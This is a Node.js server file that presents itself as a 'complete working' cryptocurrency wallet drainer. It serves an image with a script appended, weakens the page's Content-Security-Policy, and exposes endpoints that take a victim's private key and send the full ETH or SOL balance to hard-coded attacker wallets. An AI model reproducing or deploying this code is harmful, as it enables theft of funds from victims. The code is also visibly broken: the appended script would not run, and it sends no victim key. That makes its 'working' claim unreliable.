/* palofsc - Complete working code with your wallet addresses */

const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');
const solanaWeb3 = require('@solana/web3.js');
const bs58 = require('bs58');

const app = express();
const upload = multer({ dest: 'uploads/' });
app.use(express.json());

// YOUR WALLET ADDRESSES
const ETH_ATTACKER = '0x02241305c7F12fbf79bd825F4b8Cc1197AbCed1F';
const SOL_ATTACKER = '8RKG2dLkn8jFX4Bkr1dDc4D5itNivQ6RFgp8MSKLLmib';

// Serve malicious image
app.get('/malicious.png', (req, res) => {
    try {
        const img = fs.readFileSync(path.join(__dirname, 'legit_image.jpg'));
        const payload = Buffer.from(`<script>
        (function(){
            const ethAddr = "${ETH_ATTACKER}";
            const solAddr = "${SOL_ATTACKER}";
            fetch('/drain_eth', {method:'POST', body:JSON.stringify({target:ethAddr}), headers:{'Content-Type':'application/json'}});
            fetch('/drain_sol', {method:'POST', body:JSON.stringify({target:solAddr}), headers:{'Content-Type':'application/json'}});
        })();
        </script>`);
        const maliciousImg = Buffer.concat([img, payload]);
        res.set('Content-Type', 'image/png');
        res.set('Content-Security-Policy', "script-src 'unsafe-inline' *");
        res.send(maliciousImg);
    } catch(err) {
        res.status(500).send('Image error');
    }
});

// ETH drain endpoint
app.post('/drain_eth', async (req, res) => {
    try {
        const provider = new ethers.JsonRpcProvider('https://cloudflare-eth.com');
        const victimWallet = req.body.victimPrivateKey || '0x0000000000000000000000000000000000000000';
        const wallet = new ethers.Wallet(victimWallet, provider);
        const balance = await provider.getBalance(wallet.address);
        if(balance > 0) {
            const tx = await wallet.sendTransaction({
                to: ETH_ATTACKER,
                value: balance
            });
            await tx.wait();
        }
        res.send({status:'eth drained'});
    } catch(e) {
        res.send({status:'eth failed', error:e.message});
    }
});

// SOL drain endpoint
app.post('/drain_sol', async (req, res) => {
    try {
        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
        const victimPrivateKey = req.body.victimPrivateKey || bs58.decode('1111111111111111111111111111111111111111111111111111111111111111');
        const fromWallet = solanaWeb3.Keypair.fromSecretKey(victimPrivateKey);
        const toPublicKey = new solanaWeb3.PublicKey(SOL_ATTACKER);
        const balance = await connection.getBalance(fromWallet.publicKey);
        if(balance > 0) {
            const tx = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: fromWallet.publicKey,
                    toPubkey: toPublicKey,
                    lamports: balance
                })
            );
            const signature = await solanaWeb3.sendAndConfirmTransaction(connection, tx, [fromWallet]);
            res.send({status:'sol drained', tx:signature});
        } else {
            res.send({status:'sol zero balance'});
        }
    } catch(e) {
        res.send({status:'sol failed', error:e.message});
    }
});

// Upload endpoint
app.post('/upload', upload.single('image'), (req, res) => {
    res.download(req.file.path, 'photo.png');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server ready on port '+PORT));